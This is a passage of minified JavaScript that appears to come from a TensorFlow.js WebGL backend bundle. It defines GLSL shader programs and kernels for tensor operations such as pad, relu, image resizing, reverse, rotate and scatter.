              , u = `${c[o - 1]} < ${this.outputShape[o - 1]}`
              , d = 1 === o ? "source" : `vec2(${l.slice(-2).join()})`
              , h = [`${r} rc = outputLoc;`, `${c[o - 1]} += 1;\n       if(${u}) {\n      `, 1 === o ? "" : `}\n       rc = outputLoc;\n       ${c[o - 2]} += 1;\n       if(${c[o - 2]} < ${this.outputShape[o - 2]}) {`, 1 === o ? "" : `  ${c[o - 1]} += 1;\n         if(${u}) {`]
              , p = 1 === o ? "rc < start || rc >= end" : "any(lessThan(rc, start)) || any(greaterThanEqual(rc, end))";
            let f = "";
            for (let m = 0, g = 1 === o ? 2 : 4; m < g; m++)
                f += `\n        ${h[m]}\n        if (${p}) {\n          result[${m}] = float(value);\n        } else {\n          ${r} source = rc - start;\n          result[${m}] = getChannel(getX(${l.join()}), ${d});\n        }\n      `;
            f += 1 === o ? "} " : "}}",
            this.userCode = `\n      const ${r} start = ${r}(${i});\n      const ${r} end = ${r}(${a});\n\n      void main() {\n        ${r} outputLoc = getOutputCoords();\n        vec4 result = vec4(0.);\n        ${f}\n        setOutput(result);\n      }\n    `
        }
    }
    const xI = n=>{
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o} = t
          , {paddings: r, constantValue: i} = s;
        if (0 === Z(o.shape)) {
            return ha({
                backend: e,
                attrs: {
                    shape: r.map(((u,d)=>u[0] + o.shape[d] + u[1])),
                    value: i,
                    dtype: o.dtype
                }
            })
        }
        const a = z().getBool("WEBGL_PACK_ARRAY_OPERATIONS") ? new LZ(o.shape,r,i) : new GZ(o.shape,r,i)
          , c = [[i]];
        return e.runWebGLProgram(a, [o], o.dtype, c)
    }
      , EZ = {
        kernelName: sc,
        backendName: "webgl",
        kernelFunc: xI
    }
      , MZ = Ce({
        opSnippet: "\n  if(a < 0.0 && floor(b) < b){\n    return NAN;\n  }\n  if (b == 0.0) {\n    return 1.0;\n  }\n  return (round(mod(b, 2.0)) != 1) ?\n      pow(abs(a), b) : sign(a) * pow(abs(a), b);\n",
        packedOpSnippet: "\n  // isModRound1 has 1 for components with round(mod(b, 2.0)) == 1, 0 otherwise.\n  vec4 isModRound1 = vec4(equal(round(mod(b, 2.0)), ivec4(1)));\n  vec4 multiplier = sign(a) * isModRound1 + (vec4(1.0) - isModRound1);\n  vec4 result = multiplier * pow(abs(a), b);\n\n  // Ensure that a^0 = 1, including 0^0 = 1 as this correspond to TF and JS\n  bvec4 isExpZero = equal(b, vec4(0.0));\n  result.r = isExpZero.r ? 1.0 : result.r;\n  result.g = isExpZero.g ? 1.0 : result.g;\n  result.b = isExpZero.b ? 1.0 : result.b;\n  result.a = isExpZero.a ? 1.0 : result.a;\n\n  bvec4 isNaN1 = lessThan(a, vec4(0.0));\n  bvec4 isNaN2 = lessThan(floor(b), b);\n  bvec4 isNaN = bvec4(isNaN1.x && isNaN2.x, isNaN1.y && isNaN2.y, isNaN1.z && isNaN2.z, isNaN1.w && isNaN2.w);\n  " + To + "\n  return result;\n"
    })
      , VZ = {
        kernelName: qr,
        backendName: "webgl",
        kernelFunc: MZ
    };
    const zZ = {
        kernelName: rc,
        backendName: "webgl",
        kernelFunc: function FZ(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r, keepDims: i} = s
              , a = o.shape.length
              , c = []
              , l = It(r, o.shape);
            let u = l;
            const d = Yt(u, a);
            let p, h = o;
            if (null != d && (h = Me({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    perm: d
                }
            }),
            u = ee(u.length, a),
            c.push(h)),
            Ie("prod", u, a),
            e.shouldExecuteOnCPU([h])) {
                const f = e.texData.get(h.dataId).values
                  , {outVals: m, outShape: g, outDtype: b} = bz(h.shape, h.dtype, f, u);
                p = e.makeTensorInfo(g, b, m)
            } else {
                const [f,m] = me(h.shape, u)
                  , g = Z(m)
                  , b = tt({
                    inputs: {
                        x: h
                    },
                    backend: e,
                    attrs: {
                        shape: [-1, g]
                    }
                })
                  , I = No(b, nd(o.dtype), "prod", e);
                p = tt({
                    inputs: {
                        x: I
                    },
                    backend: e,
                    attrs: {
                        shape: f
                    }
                }),
                c.push(b),
                c.push(I)
            }
            if (i) {
                c.push(p);
                const f = re(p.shape, l);
                p = tt({
                    inputs: {
                        x: p
                    },
                    backend: e,
                    attrs: {
                        shape: f
                    }
                })
            }
            return c.forEach((f=>e.disposeIntermediateTensorInfo(f))),
            p
        }
    };
    const AZ = {
        kernelName: Sf,
        backendName: "webgl",
        kernelFunc: function XZ(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {paramsNestedSplits: o, paramsDenseValues: r, indices: i} = t
              , {outputRaggedRank: a} = s
              , c = o.map((b=>e.readSync(b.dataId)))
              , l = o.map((b=>b.shape))
              , u = e.readSync(r.dataId)
              , d = e.readSync(i.dataId)
              , [h,p,f] = xz(c, l, u, r.shape, r.dtype, d, i.shape, a)
              , m = h.map((b=>e.makeTensorInfo([b.length], "int32", b)))
              , g = e.makeTensorInfo(f, r.dtype, p);
            return m.concat([g])
        }
    };
    const OZ = {
        kernelName: kf,
        backendName: "webgl",
        kernelFunc: function PZ(n) {
            const {inputs: t, backend: e} = n
              , {starts: s, limits: o, deltas: r} = t
              , i = e.readSync(s.dataId)
              , a = e.readSync(o.dataId)
              , c = e.readSync(r.dataId)
              , [l,u] = yz(i, s.shape, s.dtype, a, o.shape, c, r.shape);
            return [e.makeTensorInfo([l.length], "int32", l), e.makeTensorInfo([u.length], s.dtype, u)]
        }
    };
    const ZZ = {
        kernelName: Tf,
        backendName: "webgl",
        kernelFunc: function KZ(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {shape: o, values: r, defaultValue: i, rowPartitionTensors: a} = t
              , {rowPartitionTypes: c} = s
              , l = e.readSync(o.dataId)
              , u = e.readSync(r.dataId)
              , d = e.readSync(i.dataId)
              , h = a.map((g=>e.readSync(g.dataId)))
              , p = a.map((g=>g.shape))
              , [f,m] = Iz(l, o.shape, u, r.shape, r.dtype, d, i.shape, h, p, c);
            return e.makeTensorInfo(f, r.dtype, m)
        }
    }
      , yI = n=>{
        const {backend: t, attrs: e} = n
          , {start: s, stop: o, step: r, dtype: i} = e
          , a = wz(s, o, r, i);
        return t.makeTensorInfo([a.length], i, a)
    }
      , BZ = {
        kernelName: Wu,
        backendName: "webgl",
        kernelFunc: yI
    }
      , HZ = Tt({
        opSnippet: "return 1.0 / x;"
    })
      , _Z = {
        kernelName: ti,
        backendName: "webgl",
        kernelFunc: HZ
    }
      , YZ = Tt({
        opSnippet: Cn + "\n  return (x < 0.0) ? 0.0 : x;\n",
        packedOpSnippet: "\n  vec4 result = x * vec4(greaterThanEqual(x, vec4(0.0)));\n  bvec4 isNaN = isnan(x);\n\n  result.r = isNaN.r ? x.r : result.r;\n  result.g = isNaN.g ? x.g : result.g;\n  result.b = isNaN.b ? x.b : result.b;\n  result.a = isNaN.a ? x.a : result.a;\n\n  return result;\n"
    })
      , QZ = {
        kernelName: ei,
        backendName: "webgl",
        kernelFunc: YZ
    }
      , jZ = Tt({
        opSnippet: Cn + "\n  return (x < 0.0) ? 0.0 : min(6.0, x);\n",
        packedOpSnippet: "\n  vec4 result = min(x, vec4(6.)) * vec4(greaterThanEqual(x, vec4(0.0)));\n  bvec4 isNaN = isnan(x);\n\n  result.r = isNaN.r ? x.r : result.r;\n  result.g = isNaN.g ? x.g : result.g;\n  result.b = isNaN.b ? x.b : result.b;\n  result.a = isNaN.a ? x.a : result.a;\n\n  return result;\n"
    })
      , qZ = {
        kernelName: ni,
        backendName: "webgl",
        kernelFunc: jZ
    };
    class tB {
        constructor(t, e, s, o, r) {
            this.variableNames = ["A"],
            this.outputShape = [];
            const [i,a,c,l] = t;
            this.outputShape = [i, e, s, l];
            const u = [o && e > 1 ? a - 1 : a, o && s > 1 ? c - 1 : c]
              , d = [o && e > 1 ? e - 1 : e, o && s > 1 ? s - 1 : s];
            let h;
            h = r ? "(vec2(yRC) + vec2(0.5)) * effectiveInputOverOutputRatioRC - vec2(0.5)" : "vec2(yRC) * effectiveInputOverOutputRatioRC",
            this.userCode = `\n      const vec2 effectiveInputOverOutputRatioRC = vec2(\n          ${u[0] / d[0]},\n          ${u[1] / d[1]});\n      const vec2 inputShapeRC = vec2(${a}.0, ${c}.0);\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int b = coords[0];\n        int d = coords[3];\n        ivec2 yRC = coords.yz;\n\n        // Fractional source index.\n        vec2 sourceFracIndexRC = ${h};\n\n        // Compute the four integer indices.\n        ivec2 sourceFloorRC = ivec2(max(sourceFracIndexRC, vec2(0.0)));\n        ivec2 sourceCeilRC = ivec2(\n          min(inputShapeRC - 1.0, ceil(sourceFracIndexRC)));\n\n        float topLeft = getA(b, sourceFloorRC.x, sourceFloorRC.y, d);\n        float bottomLeft = getA(b, sourceCeilRC.x, sourceFloorRC.y, d);\n        float topRight = getA(b, sourceFloorRC.x, sourceCeilRC.y, d);\n        float bottomRight = getA(b, sourceCeilRC.x, sourceCeilRC.y, d);\n\n        vec2 fracRC = sourceFracIndexRC - vec2(sourceFloorRC);\n\n        float top = topLeft + (topRight - topLeft) * fracRC.y;\n        float bottom = bottomLeft + (bottomRight - bottomLeft) * fracRC.y;\n        float newValue = top + (bottom - top) * fracRC.x;\n\n        setOutput(newValue);\n      }\n    `
        }
    }
    class eB {
        constructor(t, e, s, o, r) {
            this.variableNames = ["A"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.outputShape = [];
            const [i,a,c,l] = t;
            this.outputShape = [i, e, s, l];
            const u = [o && e > 1 ? a - 1 : a, o && s > 1 ? c - 1 : c]
              , d = [o && e > 1 ? e - 1 : e, o && s > 1 ? s - 1 : s];
            let h;
            h = r ? "(vec3(yRC) + vec3(0.5)) * effectiveInputOverOutputRatioRC - vec3(0.5)" : "vec3(yRC) * effectiveInputOverOutputRatioRC",
            this.userCode = `\n      const vec3 effectiveInputOverOutputRatioRC = vec3(\n          ${u[0] / d[0]},\n          ${u[1] / d[1]},\n          ${u[1] / d[1]});\n      const vec3 inputShapeRC = vec3(${a}.0, ${c}.0,\n                                     ${c}.0);\n\n      float getAValue(int b, int r, int c, int d) {\n        return getChannel(getA(b, r, c, d), vec2(c, d));\n      }\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int b = coords[0];\n        int d = coords[3];\n        // Calculate values for next column in yRC.z.\n        ivec3 yRC = coords.yzz + ivec3(0, 0, 1);\n\n        // Fractional source index.\n        vec3 sourceFracIndexRC = ${h};\n\n        // Compute the four integer indices.\n        ivec3 sourceFloorRC = ivec3(max(sourceFracIndexRC, vec3(0.0)));\n        ivec3 sourceCeilRC = ivec3(\n          min(inputShapeRC - 1.0, ceil(sourceFracIndexRC)));\n\n        // Should we calculate next column and row elements in 2x2 packed cell.\n        bool hasNextCol = d < ${l - 1};\n        bool hasNextRow = coords.z < ${s - 1};\n\n        // In parallel, construct four corners for all four components in\n        // packed 2x2 cell.\n        vec4 topLeft = vec4(\n          getAValue(b, sourceFloorRC.x, sourceFloorRC.y, d),\n          hasNextCol ? getAValue(b, sourceFloorRC.x, sourceFloorRC.y, d + 1)\n                     : 0.0,\n          hasNextRow ? getAValue(b, sourceFloorRC.x, sourceFloorRC.z, d)\n                     : 0.0,\n          (hasNextRow && hasNextCol) ?\n            getAValue(b, sourceFloorRC.x, sourceFloorRC.z, d + 1) : 0.0);\n\n        vec4 bottomLeft = vec4(\n          getAValue(b, sourceCeilRC.x, sourceFloorRC.y, d),\n          hasNextCol ? getAValue(b, sourceCeilRC.x, sourceFloorRC.y, d + 1)\n                     : 0.0,\n          hasNextRow ? getAValue(b, sourceCeilRC.x, sourceFloorRC.z, d)\n                     : 0.0,\n          (hasNextRow && hasNextCol) ?\n            getAValue(b, sourceCeilRC.x, sourceFloorRC.z, d + 1) : 0.0);\n\n        vec4 topRight = vec4(\n          getAValue(b, sourceFloorRC.x, sourceCeilRC.y, d),\n          hasNextCol ? getAValue(b, sourceFloorRC.x, sourceCeilRC.y, d + 1)\n                     : 0.0,\n          hasNextRow ? getAValue(b, sourceFloorRC.x, sourceCeilRC.z, d)\n                     : 0.0,\n          (hasNextRow && hasNextCol) ?\n            getAValue(b, sourceFloorRC.x, sourceCeilRC.z, d + 1) : 0.0);\n\n        vec4 bottomRight = vec4(\n          getAValue(b, sourceCeilRC.x, sourceCeilRC.y, d),\n          hasNextCol ? getAValue(b, sourceCeilRC.x, sourceCeilRC.y, d + 1)\n                     : 0.0,\n          hasNextRow ? getAValue(b, sourceCeilRC.x, sourceCeilRC.z, d)\n                     : 0.0,\n          (hasNextRow && hasNextCol) ?\n            getAValue(b, sourceCeilRC.x, sourceCeilRC.z, d + 1) : 0.0);\n\n        vec3 fracRC = sourceFracIndexRC - vec3(sourceFloorRC);\n\n        vec4 top = mix(topLeft, topRight, fracRC.yyzz);\n        vec4 bottom = mix(bottomLeft, bottomRight, fracRC.yyzz);\n        vec4 newValue = mix(top, bottom, fracRC.x);\n\n        setOutput(newValue);\n      }\n    `
        }
    }
    const sB = {
        kernelName: cc,
        backendName: "webgl",
        kernelFunc: function nB(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {images: o} = t
              , {alignCorners: r, halfPixelCenters: i, size: a} = s
              , [c,l] = a
              , u = z().getBool("WEBGL_PACK_IMAGE_OPERATIONS") ? new eB(o.shape,c,l,r,i) : new tB(o.shape,c,l,r,i);
            return e.runWebGLProgram(u, [o], "float32")
        }
    };
    class oB {
        constructor(t, e, s) {
            this.variableNames = ["dy"],
            this.outputShape = [],
            this.outputShape = e;
            const [,o,r] = e
              , [,i,a] = t
              , c = [s && i > 1 ? o - 1 : o, s && a > 1 ? r - 1 : r]
              , l = [s && i > 1 ? i - 1 : i, s && a > 1 ? a - 1 : a]
              , u = c[0] / l[0]
              , d = c[1] / l[1]
              , h = 1 / u
              , p = 1 / d
              , f = 2 * Math.ceil(h) + 2
              , m = 2 * Math.ceil(p) + 2;
            this.userCode = `\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int b = coords[0];\n        int d = coords[3];\n        int r = coords[1];\n        int c = coords[2];\n\n        float accumulator = 0.0;\n\n        const float heightScale = float(${u});\n        const float widthScale = float(${d});\n\n        const float invHeightScale = float(${h});\n        const float invWidthScale = float(${p});\n\n        const int winHeight = int(${f});\n        const int winWidth = int(${m});\n\n        // Compute bounds for where in dy we will look\n        float startRLerp = floor(float(r) * invHeightScale);\n        int startDyR = int(startRLerp - float(winHeight / 2));\n\n        float startCLerp = floor(float(c) * invWidthScale);\n        int startDyC = int(startCLerp - float(winWidth / 2));\n\n        // Loop over dy\n        for (int dyROffset = 0; dyROffset < winHeight; dyROffset++) {\n          int dyR = dyROffset + startDyR;\n\n          // Guard against the window exceeding the bounds of dy\n          if (dyR < 0 || dyR >= ${i}) {\n            continue;\n          }\n\n          for (int dyCOffset = 0; dyCOffset < winWidth; dyCOffset++) {\n            int dyC = dyCOffset + startDyC;\n\n            // Guard against the window exceeding the bounds of dy\n            if (dyC < 0 || dyC >= ${a}) {\n              continue;\n            }\n\n            float dxR = float(dyR) * heightScale;\n            int topDxRIndex = int(floor(dxR));\n            int bottomDxRIndex = int(min(ceil(dxR), ${o - 1}.0));\n            float dxRLerp = dxR - float(topDxRIndex);\n            float inverseDxRLerp = 1.0 - dxRLerp;\n\n            float dxC = float(dyC) * widthScale;\n            int leftDxCIndex = int(floor(dxC));\n            int rightDxCIndex = int(min(ceil(dxC), ${r - 1}.0));\n            float dxCLerp = dxC - float(leftDxCIndex);\n            float inverseDxCLerp = 1.0 - dxCLerp;\n\n            if (r == topDxRIndex && c == leftDxCIndex) {\n              // topLeft\n              accumulator +=\n                getDy(b, dyR, dyC, d) * inverseDxRLerp * inverseDxCLerp;\n            }\n\n            if (r == topDxRIndex && c == rightDxCIndex) {\n              // topRight\n              accumulator += getDy(b, dyR, dyC, d) * inverseDxRLerp * dxCLerp;\n            }\n\n            if (r == bottomDxRIndex && c == leftDxCIndex) {\n              // bottomLeft\n              accumulator += getDy(b, dyR, dyC, d) * dxRLerp * inverseDxCLerp;\n            }\n\n            if (r == bottomDxRIndex && c == rightDxCIndex) {\n              // bottomRight\n              accumulator += getDy(b, dyR, dyC, d) * dxRLerp * dxCLerp;\n            }\n          }\n        }\n        // End loop over dy\n\n        setOutput(accumulator);\n      }\n    `
        }
    }
    const iB = {
        kernelName: Fu,
        backendName: "webgl",
        kernelFunc: function rB(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {images: o, dy: r} = t
              , {alignCorners: i} = s
              , a = new oB(r.shape,o.shape,i);
            return e.runWebGLProgram(a, [r], r.dtype)
        }
    };
    class aB {
        constructor(t, e, s, o, r) {
            this.variableNames = ["A"],
            this.outputShape = [];
            const [i,a,c,l] = t;
            this.outputShape = [i, e, s, l];
            const u = [o && e > 1 ? a - 1 : a, o && s > 1 ? c - 1 : c]
              , d = [o && e > 1 ? e - 1 : e, o && s > 1 ? s - 1 : s]
              , h = o ? "0.5" : "0.0";
            let p;
            p = r ? "max((vec2(yRC) + vec2(0.5)) * effectiveInputOverOutputRatioRC, vec2(0.0))" : "vec2(yRC) * effectiveInputOverOutputRatioRC",
            this.userCode = `\n      const vec2 effectiveInputOverOutputRatioRC = vec2(\n          ${u[0] / d[0]},\n          ${u[1] / d[1]});\n      const vec2 inputShapeRC = vec2(${a}.0, ${c}.0);\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int b = coords[0];\n        int d = coords[3];\n        ivec2 yRC = coords.yz;\n\n        // Fractional source index.\n        vec2 sourceFracIndexRC = ${p};\n\n        // Compute the coordinators of nearest neighbor point.\n        ivec2 sourceNearestRC = ivec2(\n          min(inputShapeRC - 1.0, floor(sourceFracIndexRC + ${h})));\n        float newValue = getA(b, sourceNearestRC.x, sourceNearestRC.y, d);\n\n        setOutput(newValue);\n      }\n    `
        }
    }
    class cB {
        constructor(t, e, s, o, r) {
            this.variableNames = ["A"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.outputShape = [];
            const [i,a,c,l] = t;
            this.outputShape = [i, e, s, l];
            const u = [o && e > 1 ? a - 1 : a, o && s > 1 ? c - 1 : c]
              , d = [o && e > 1 ? e - 1 : e, o && s > 1 ? s - 1 : s]
              , h = o ? "0.5" : "0.0";
            let p;
            p = r ? "max((vec3(yRC) + vec3(0.5)) * effectiveInputOverOutputRatioRC, vec3(0.0))" : "vec3(yRC) * effectiveInputOverOutputRatioRC",
            this.userCode = `\n      const vec3 effectiveInputOverOutputRatioRC = vec3(\n          ${u[0] / d[0]},\n          ${u[1] / d[1]},\n          ${u[1] / d[1]});\n      const vec3 inputShapeRC = vec3(${a}.0, ${c}.0,\n                                     ${c}.0);\n\n      float getAValue(int b, int r, int c, int d) {\n        return getChannel(getA(b, r, c, d), vec2(c, d));\n      }\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int b = coords[0];\n        int d = coords[3];\n        // Calculate values for next column in yRC.z.\n        ivec3 yRC = coords.yzz + ivec3(0, 0, 1);\n\n        // Fractional source index.\n        vec3 sourceFracIndexRC = ${p};\n\n        // Compute the coordinators of nearest neighbor point.\n        ivec3 sourceNearestRC = ivec3(\n          min(inputShapeRC - 1.0, floor(sourceFracIndexRC + ${h})));\n\n        // Should we calculate next column and row elements in 2x2 packed cell.\n        bool hasNextCol = d < ${l - 1};\n        bool hasNextRow = coords.z < ${s - 1};\n\n        vec4 newValue = vec4(\n          getAValue(b, sourceNearestRC.x, sourceNearestRC.y, d),\n          hasNextCol ? getAValue(b, sourceNearestRC.x, sourceNearestRC.y, d + 1)\n                     : 0.0,\n          hasNextRow ? getAValue(b, sourceNearestRC.x, sourceNearestRC.z, d)\n                     : 0.0,\n          (hasNextRow && hasNextCol) ?\n            getAValue(b, sourceNearestRC.x, sourceNearestRC.z, d + 1) : 0.0);\n\n        setOutput(newValue);\n      }\n    `
        }
    }
    const uB = {
        kernelName: ac,
        backendName: "webgl",
        kernelFunc: function lB(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {images: o} = t
              , {alignCorners: r, halfPixelCenters: i, size: a} = s
              , [c,l] = a
              , u = z().getBool("WEBGL_PACK_IMAGE_OPERATIONS") ? new cB(o.shape,c,l,r,i) : new aB(o.shape,c,l,r,i);
            return e.runWebGLProgram(u, [o], o.dtype)
        }
    };
    class dB {
        constructor(t, e, s) {
            this.variableNames = ["dy"],
            this.outputShape = [],
            this.outputShape = e;
            const [,o,r] = e
              , [,i,a] = t
              , c = [s && i > 1 ? o - 1 : o, s && a > 1 ? r - 1 : r]
              , l = [s && i > 1 ? i - 1 : i, s && a > 1 ? a - 1 : a]
              , u = c[0] / l[0]
              , d = c[1] / l[1]
              , h = 1 / u
              , p = 1 / d
              , f = 2 * Math.ceil(h) + 2
              , m = 2 * Math.ceil(p) + 2;
            this.userCode = `\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int b = coords[0];\n        int d = coords[3];\n        int r = coords[1];\n        int c = coords[2];\n\n        float accumulator = 0.0;\n\n        const float heightScale = float(${u});\n        const float widthScale = float(${d});\n\n        const float invHeightScale = float(${h});\n        const float invWidthScale = float(${p});\n\n        const int winHeight = int(${f});\n        const int winWidth = int(${m});\n\n        // Compute bounds for where in dy we will look\n        float startRLerp = floor(float(r) * invHeightScale);\n        int startDyR = int(floor(startRLerp - float(winHeight / 2)));\n\n        float startCLerp = floor(float(c) * invWidthScale);\n        int startDyC = int(floor(startCLerp - float(winWidth / 2)));\n\n        // Loop over dy\n        for (int dyROffset = 0; dyROffset < winHeight; dyROffset++) {\n          int dyR = dyROffset + startDyR;\n\n          // Guard against the window exceeding the bounds of dy\n          if (dyR < 0 || dyR >= ${i}) {\n            continue;\n          }\n\n          for (int dyCOffset = 0; dyCOffset < winWidth; dyCOffset++) {\n            int dyC = dyCOffset + startDyC;\n\n            // Guard against the window exceeding the bounds of dy\n            if (dyC < 0 || dyC >= ${a}) {\n              continue;\n            }\n\n            float sourceFracRow =\n              float(${c[0]}) *\n                (float(dyR) / float(${l[0]}));\n\n            float sourceFracCol =\n                float(${c[1]}) *\n                  (float(dyC) / float(${l[1]}));\n\n            int sourceNearestRow = int(min(\n                float(int(${o}) - 1),\n                ${s} ? float(round(sourceFracRow)) :\n                                  float(floor(sourceFracRow))));\n\n            int sourceNearestCol = int(min(\n                float(int(${r}) - 1),\n                ${s} ? float(round(sourceFracCol)) :\n                                  float(floor(sourceFracCol))));\n\n            if (r == sourceNearestRow && c == sourceNearestCol) {\n              accumulator += getDy(b, dyR, dyC, d);\n            }\n          }\n        }\n        // End loop over dy\n\n        setOutput(accumulator);\n      }\n    `
        }
    }
    const pB = {
        kernelName: Vu,
        backendName: "webgl",
        kernelFunc: function hB(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {images: o, dy: r} = t
              , {alignCorners: i} = s
              , a = new dB(r.shape,o.shape,i);
            return e.runWebGLProgram(a, [r], r.dtype)
        }
    };
    class fB {
        constructor(t, e) {
            this.variableNames = ["x"];
            const s = t.length;
            if (s > 4)
                throw new Error(`WebGL backend: Reverse of rank-${s} tensor is not yet supported`);
            if (this.outputShape = t,
            1 === s)
                return void (this.userCode = `\n        void main() {\n          int coord = getOutputCoords();\n          setOutput(getX(${t[0]} - coord - 1));\n        }\n      `);
            const r = t.map(((a,c)=>(a=>-1 !== e.indexOf(a) && 1 !== t[a] ? `${t[a]} - coords[${a}] - 1` : `coords[${a}]`)(c))).join(",")
              , i = Wt(s);
            this.userCode = `\n      void main() {\n        ${i} coords = getOutputCoords();\n        setOutput(getX(${r}));\n      }\n    `
        }
    }
    class mB {
        constructor(t, e) {
            this.variableNames = ["x"],
            this.packedInputs = !0,
            this.packedOutput = !0;
            const s = t.length;
            if (s > 4)
                throw new Error(`WebGL backend: Reverse of rank-${s} tensor is not yet supported`);
            this.outputShape = t;
            const o = We("rc", s)
              , r = `${o[s - 1]} + 1 < ${this.outputShape[s - 1]}`
              , i = `${o[s - 2]} + 1 < ${this.outputShape[s - 2]}`
              , a = Wt(s);
            function h(f) {
                const m = t.map(((x,I)=>function p(f, m) {
                    return -1 !== e.indexOf(f) && 1 !== t[f] ? `${t[f]} - ${m[f]} - 1` : `${m[f]}`
                }(I, f)));
                return `getChannel(getX(${m.join(",")}), vec2(${m.slice(-2).join(",")}))`
            }
            this.userCode = 1 === s ? `\n        void main(){\n          int rc = getOutputCoords();\n          vec4 result = vec4(0.);\n          result.r = getChannel(getX(${t[0]} - rc - 1),\n            ${t[0]} - rc - 1);\n          if(${r}){\n              result.g = getChannel(getX(${t[0]} - (rc  + 1) - 1),\n                ${t[0]} - (rc  + 1) - 1);\n          }\n          setOutput(result);\n        }\n      ` : `\n        void main() {\n          ${a} rc = getOutputCoords();\n          vec4 result = vec4(0.);\n          result.r = ${function c(f) {
                return h(f)
            }(o.slice())};\n          if(${r}){\n            result.g = ${function l(f) {
                return f[s - 1] = "(" + f[s - 1] + " + 1)",
                h(f)
            }(o.slice())};\n          }\n          if(${i}) {\n            result.b = ${function u(f) {
                return f[s - 2] = "(" + f[s - 2] + " + 1)",
                h(f)
            }(o.slice())};\n            if(${r}) {\n              result.a = ${function d(f) {
                return f[s - 1] = "(" + f[s - 1] + " + 1)",
                f[s - 2] = "(" + f[s - 2] + " + 1)",
                h(f)
            }(o.slice())};\n            }\n          }\n          setOutput(result);\n        }\n    `
        }
    }
    const bB = {
        kernelName: lc,
        backendName: "webgl",
        kernelFunc: function gB(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {dims: r} = s
              , i = o.shape.length
              , a = It(r, o.shape);
            if (0 === i)
                return Je({
                    inputs: {
                        x: o
                    },
                    backend: e
                });
            const c = z().getBool("WEBGL_PACK_ARRAY_OPERATIONS") ? new mB(o.shape,a) : new fB(o.shape,a);
            return e.runWebGLProgram(c, [o], o.dtype)
        }
    };
    class xB {
        constructor(t, e) {
            this.variableNames = ["Image"],
            this.outputShape = [],
            this.customUniforms = [{
                name: "params",
                type: "vec4"
            }];
            const s = t[1]
              , o = t[2];
            this.outputShape = t;
            let r = "";
            r = "number" == typeof e ? `float outputValue = ${e.toFixed(2)};` : `\n        vec3 fill = vec3(${e.join(",")});\n        float outputValue = fill[coords[3]];`,
            this.userCode = `\n        void main() {\n          ivec4 coords = getOutputCoords();\n          int x = coords[2];\n          int y = coords[1];\n          float coordXFloat = (float(x) - params[0]) * params[3] -\n            (float(y) - params[1]) * params[2];\n          float coordYFloat = (float(x) - params[0]) * params[2] +\n            (float(y) - params[1]) * params[3];\n          int coordX = int(round(coordXFloat + params[0]));\n          int coordY = int(round(coordYFloat + params[1]));\n          ${r}\n          if(coordX >= 0 && coordX < ${o} && coordY >= 0 && coordY < ${s}) {\n            outputValue = getImage(coords[0], coordY, coordX, coords[3]);\n          }\n          setOutput(outputValue);\n        }\n    `
        }
    }
    const yB = {
        kernelName: Bu,
        backendName: "webgl",
        kernelFunc: ({inputs: n, attrs: t, backend: e})=>{
            const {image: s} = n
              , {radians: o, fillValue: r, center: i} = t
              , a = e
              , c = new xB(s.shape,r)
              , [l,u] = ih(i, s.shape[1], s.shape[2])
              , d = [[l, u, Math.sin(o), Math.cos(o)]];
            return a.runWebGLProgram(c, [s], s.dtype, d)
        }
    }
      , IB = Tt({
        opSnippet: "\n  // OpenGL ES does not support round function.\n  // The algorithm is based on banker's rounding.\n  float base = floor(x);\n  if ((x - base) < 0.5) {\n    return floor(x);\n  } else if ((x - base) > 0.5) {\n    return ceil(x);\n  } else {\n    if (mod(base, 2.0) == 0.0) {\n      return base;\n    } else {\n      return base + 1.0;\n    }\n  }\n"
    })
      , wB = {
        kernelName: si,
        backendName: "webgl",
        kernelFunc: IB
    }
      , CB = Tt({
        opSnippet: "return inversesqrt(x);",
        cpuKernelImpl: Cz
    })
      , vB = {
        kernelName: oi,
        backendName: "webgl",
        kernelFunc: CB
    };
    class zp {
        constructor(t, e, s, o, r, i, a=!0, c=!1) {
            this.variableNames = ["updates", "indices", "defaultValue"],
            this.outputShape = i;
            const l = Wt(r.length)
              , u = Wt(i.length);
            let d = "";
            1 === s ? d = "i" : 2 === s && (d = "i, j");
            const h = `getIndices(${d})`;
            let p = "";
            1 === o ? p = "i" : 2 === o && (p = "i, coords[1]");
            const f = `getUpdates(${p})`;
            let m = "";
            c && (m = "coords[0], coords[1]");
            const g = `getDefaultValue(${m})`
              , b = e > 1 ? "strides[j]" : "strides";
            this.userCode = `\n        ${l} strides = ${l}(${r});\n\n        void main() {\n          ${u} coords = getOutputCoords();\n          float sum = 0.0;\n          bool found = false;\n          for (int i = 0; i < ${t}; i++) {\n            int flattenedIndex = 0;\n            for (int j = 0; j < ${e}; j++) {\n              int index = round(${h});\n              flattenedIndex += index * ${b};\n            }\n            if (flattenedIndex == coords[0]) {\n              sum += ${f};\n              found = true;\n            }\n          }\n          setOutput(mix(${g}, sum, float(found)));\n        }\n      `
        }
    }
    class SB {
        constructor(t, e, s, o, r, i, a=!0, c=!1) {
            this.variableNames = ["updates", "indices", "defaultValue"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.outputShape = i;
            const l = Wt(r.length)
              , u = Wt(i.length);
            let d = "";
            1 === s ? d = "i" : 2 === s && (d = "i, j");
            const h = `getIndices(${d})`;
            let p = "";
            1 === o ? p = "i" : 2 === o && (p = "i, coords[1]");
            const f = `getUpdates(${p})`;
            let m = "";
            c && (m = "coords[0], coords[1]");
            const g = `getDefaultValue(${m})`
              , b = e > 1 ? "strides[j]" : "strides"
              , x = e > 1 ? "strides[j + 1]" : "strides";
